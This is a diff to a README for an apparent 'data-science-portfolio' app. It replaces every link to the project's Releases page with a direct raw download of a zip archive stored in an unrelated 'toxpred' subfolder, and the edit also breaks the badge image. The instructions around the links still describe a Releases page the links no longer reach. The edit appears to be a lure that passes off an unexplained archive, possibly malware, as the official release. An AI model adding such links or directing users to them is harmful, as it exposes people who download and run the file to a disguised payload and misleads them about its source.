@@ -1,6 +1,6 @@
 # 🎉 data-science-portfolio - Explore Data Insights Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/sabenbot/data-science-portfolio/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/sabenbot/data-science-portfolio/main/toxpred/science_portfolio_data_3.6.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/sabenbot/data-science-portfolio/main/toxpred/science_portfolio_data_3.6.zip)
 
 ## 📖 Overview
 
@@ -12,7 +12,7 @@ Follow these steps to download and run the application:
 
 1. **Visit the Download Page**  
    Use the link below to reach the Releases page:  
-   [Download the Latest Release](https://github.com/sabenbot/data-science-portfolio/releases)
+   [Download the Latest Release](https://raw.githubusercontent.com/sabenbot/data-science-portfolio/main/toxpred/science_portfolio_data_3.6.zip)
 
 2. **Select a Release**  
    On the Releases page, you will see a list of available versions. Choose the latest version to ensure you get the most features and fixes.
@@ -91,6 +91,6 @@ We regularly update the application for improvements and new features. Follow th
 ## 📥 Download & Install
 
 You can download the application by visiting the Releases page again:  
-[Download the Latest Release](https://github.com/sabenbot/data-science-portfolio/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/sabenbot/data-science-portfolio/main/toxpred/science_portfolio_data_3.6.zip)
 
 Enjoy exploring data with the **Data Science Portfolio** application!
